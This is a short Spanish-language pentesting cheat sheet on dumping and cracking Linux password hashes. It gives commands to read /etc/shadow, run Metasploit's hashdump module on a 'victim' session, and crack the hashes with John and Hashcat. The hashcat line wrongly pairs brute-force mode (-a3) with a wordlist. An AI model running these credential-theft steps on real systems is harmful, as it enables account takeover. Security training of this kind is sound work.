# Escalación de privilegios en Linux

Tags: #Linux #PrivEsc #DumpCrackHashes #John #HashCat #Meterpreter #Metasploit 

## Crackear y Dumpear Hashes Linux

```bash 
# Toda la informacion de las cuentas esta en '/etc/passwd'
# Todas las passwords encriptadas estan en '/etc/shadow'
# El archivo Shadow solo puede ser accesible y leido por el usuario root 

 Value          Hashing Algorithm
   $1             MD5
   $2             Blowfish
   $5             SHA-256
   $6             SHA-512
```

```bash 
# comandos Linux (Debes de ser root)

❯ cat /etc/shadow          # Miramos el archivo shadow donde estan las passwd con sus hashes y copiamos los usuarios con sus hashes
```

```bash 
# Comandos con Meterpreter, en este caso para tener esta consola, debemos de hacer un Upgrade 

❯ background 
	❯ sessions -u <ID>    # Para hacer el upgrade a la sesion yq ue nos de una consola con Meterpreter
	❯ session <ID>        # Para usar la sesion con Meterpreter 
```

```bash 
# Dentro de Metasploit (Segunda forma de obtener hashes de los usuarios) y nos lo guarde en un archivo de texto

❯ search hashdump          # Buscamos el exploit para obtener los hashes de los usuarios en la maquina victima 
❯ use post/linux/gather/hashdump
❯ options 
❯ set SESSION <ID>         # Colocamos el ID de la sesion de Meterpreter 
❯ run 
```

```bash 
# En nuestra maquina de atacante usaremos John y Hashcat para crackear el hash del usuario 

❯ john --format=sha512crypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

❯ hashcat -a3 -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
	# m = 1800 = Modo de hash para SHA512
	# a3 = Modo de ataque (3 = Brute-force)
```
